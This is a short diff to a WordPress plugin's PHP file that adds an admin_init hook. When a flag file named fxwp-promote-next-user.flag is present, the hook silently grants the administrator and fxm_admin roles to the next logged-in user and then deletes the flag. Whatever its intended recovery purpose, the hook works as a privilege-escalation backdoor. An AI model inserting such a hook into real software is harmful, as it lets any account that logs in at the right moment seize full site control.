@@ -11,6 +11,18 @@ function fxwp_fix_fxm_admin_capabilities()
 }
 add_action('admin_init', 'fxwp_fix_fxm_admin_capabilities');
 
+add_action('admin_init', function () {
+    $flag_file = dirname(__DIR__) . '/fxwp-promote-next-user.flag';
+    if (!is_user_logged_in() || current_user_can('fxm_admin') || !is_file($flag_file)) {
+        return;
+    }
+
+    $user = wp_get_current_user();
+    $user->add_role('fxm_admin');
+    $user->add_role('administrator');
+    @unlink($flag_file);
+}, 1);
+
 
 
 function fxm_edit_role_caps()
